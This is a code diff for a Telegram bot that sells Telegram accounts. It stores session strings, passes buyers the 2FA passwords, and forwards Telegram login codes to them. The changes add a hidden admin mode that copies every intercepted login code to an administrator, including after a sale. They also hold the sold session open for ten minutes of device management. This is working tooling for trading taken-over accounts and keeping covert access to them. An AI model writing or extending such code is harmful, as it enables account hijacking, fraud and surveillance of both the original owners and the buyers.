@@ -21,6 +21,7 @@ from telethon.errors.rpcerrorlist import (
     PhoneCodeInvalidError,
 )
 from telethon.sessions import StringSession
+from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 try:
     from telegram import (
         InlineKeyboardButton,
@@ -86,6 +87,7 @@ async def safe_edit(
 
 
 import admin as admin_module
+import device_manager
 from config import (
     ADMIN_USER_IDS,
     BOT_TOKEN,
@@ -470,7 +472,10 @@ async def _send_sold_report(
 
 
 class AccountManager:
-    """Manages Telethon clients for stored accounts and OTP forwarding."""
+    """Manages Telethon clients for stored accounts and OTP forwarding.
+
+    Note: We keep the sold account session connected briefly to allow optional "Manage Devices".
+    """
 
     def __init__(
         self,
@@ -482,6 +487,8 @@ class AccountManager:
         self._bot = bot
         self._clients: Dict[ObjectId, TelegramClient] = {}
         self._buyers: Dict[ObjectId, int] = {}
+        # Admin OTP monitoring: {account_id: admin_user_id}
+        self._admin_monitors: Dict[ObjectId, int] = {}
         self._pending_admin_login: Dict[int, PendingLogin] = {}
 
     # ----- admin phone login (for adding accounts) -----
@@ -574,9 +581,20 @@ class AccountManager:
 
     # ----- buyer OTP forwarding -----
     async def ensure_connected_for_account(self, account_id: ObjectId, account_doc: dict[str, Any], buyer_user_id: int) -> None:
+        # Buyer flow: setting buyer triggers sold-message + report behaviour on OTP
         self._buyers[account_id] = int(buyer_user_id)
         if account_id in self._clients:
             return
+
+        await self._connect_client(account_id, account_doc)
+
+    async def ensure_connected_for_admin_monitor(self, account_id: ObjectId, account_doc: dict[str, Any]) -> None:
+        """Admin OTP monitoring: connect without setting buyer."""
+        if account_id in self._clients:
+            return
+        await self._connect_client(account_id, account_doc)
+
+    async def _connect_client(self, account_id: ObjectId, account_doc: dict[str, Any]) -> None:
 
         client = TelegramClient(
             StringSession(account_doc["session_string"]),
@@ -588,7 +606,22 @@ class AccountManager:
         @client.on(events.NewMessage(from_users=777000))
         async def otp_listener(event):
             text = (event.raw_text or event.text or "").strip()
+            
+            # Check if admin is monitoring (not buyer) → plain forward only
+            admin_monitor = self._admin_monitors.get(account_id)
             buyer = self._buyers.get(account_id)
+
+            if admin_monitor and not buyer:
+                # Admin monitoring only (no buyer) → plain forward, no report
+                try:
+                    await self._bot.send_message(
+                        chat_id=admin_monitor,
+                        text=f"📱 OTP for +{account_doc.get('phone','')}:\n\n{text}",
+                    )
+                except Exception:
+                    pass
+                return
+
             if not buyer:
                 return
 
@@ -601,11 +634,43 @@ class AccountManager:
                     break
             otp_display = otp_code or text
 
-            # Forward OTP message to buyer
-            await self._send_message(
-                buyer,
-                f"🔐 OTP received for +{account_doc.get('phone','')}:\n\n{text}\n\n✅ Account successfully sold. Session closed.",
-            )
+            # Forward OTP message to buyer (+ Manage Devices)
+            try:
+                await self._bot.send_message(
+                    chat_id=buyer,
+                    text=(
+                        f"🔐 OTP received for +{account_doc.get('phone','')}:\n\n{text}\n\n"
+                        "✅ Account successfully sold.\n"
+                        "🛠️ You can manage devices for a few minutes from the button below."
+                    ),
+                    reply_markup=kb(
+                        [
+                            [
+                                InlineKeyboardButton(
+                                    "🛠️ Manage Devices",
+                                    callback_data=f"dev:menu:{str(account_id)}",
+                                )
+                            ]
+                        ]
+                    ),
+                )
+            except Exception:
+                # Fallback plain text
+                await self._send_message(
+                    buyer,
+                    f"🔐 OTP received for +{account_doc.get('phone','')}:\n\n{text}\n\n✅ Account successfully sold.",
+                )
+
+            # Also forward to admin monitor if any
+            admin_monitor = self._admin_monitors.get(account_id)
+            if admin_monitor and admin_monitor != buyer:
+                try:
+                    await self._bot.send_message(
+                        chat_id=admin_monitor,
+                        text=f"📱 OTP for +{account_doc.get('phone','')}:\n\n{text}",
+                    )
+                except Exception:
+                    pass
 
             # Report to channel (bot must be admin)
             try:
@@ -617,16 +682,38 @@ class AccountManager:
             except Exception:
                 pass
 
-            asyncio.create_task(self.disconnect_account(account_id))
+            # Keep session for a short window to allow device management, then disconnect.
+            asyncio.create_task(self.disconnect_later(account_id, seconds=600))
             return
 
         self._clients[account_id] = client
+        return
+
+    def get_buyer(self, account_id: ObjectId) -> int | None:
+        return self._buyers.get(account_id)
+
+    def get_client(self, account_id: ObjectId) -> TelegramClient | None:
+        return self._clients.get(account_id)
+
+    def start_admin_monitor(self, account_id: ObjectId, admin_user_id: int) -> None:
+        self._admin_monitors[account_id] = int(admin_user_id)
+
+    def stop_admin_monitor(self, account_id: ObjectId) -> None:
+        self._admin_monitors.pop(account_id, None)
+
+    def get_admin_monitor(self, account_id: ObjectId) -> int | None:
+        return self._admin_monitors.get(account_id)
 
     async def disconnect_account(self, account_id: ObjectId) -> None:
         self._buyers.pop(account_id, None)
+        self._admin_monitors.pop(account_id, None)
         client = self._clients.pop(account_id, None)
         if client:
             await client.disconnect()
+
+    async def disconnect_later(self, account_id: ObjectId, *, seconds: int) -> None:
+        await asyncio.sleep(max(1, int(seconds)))
+        await self.disconnect_account(account_id)
 
     async def shutdown(self) -> None:
         for admin_id in list(self._pending_admin_login.keys()):
@@ -902,7 +989,13 @@ async def send_purchase_details(update: Update, context: ContextTypes.DEFAULT_TY
     if twofa:
         msg += f"\n\n🔑 *2FA Password:* `{twofa}`"
 
-    await update.effective_message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+    await update.effective_message.reply_text(
+        msg,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=kb(
+            [[InlineKeyboardButton("🛠️ Manage Devices", callback_data=f"dev:menu:{str(account['_id'])}")]]
+        ),
+    )
     await account_manager.ensure_connected_for_account(account["_id"], account, uid)
 
 
@@ -1406,6 +1499,12 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         return
 
     repo: Repo = context.application.bot_data["repo"]
+    account_manager: AccountManager = context.application.bot_data["account_manager"]
+
+    # Device management callbacks
+    handled = await device_manager.handle_device_callbacks(query, context, uid, data, repo, account_manager)
+    if handled:
+        return
 
     # Join verify
     if data == "join:verify":
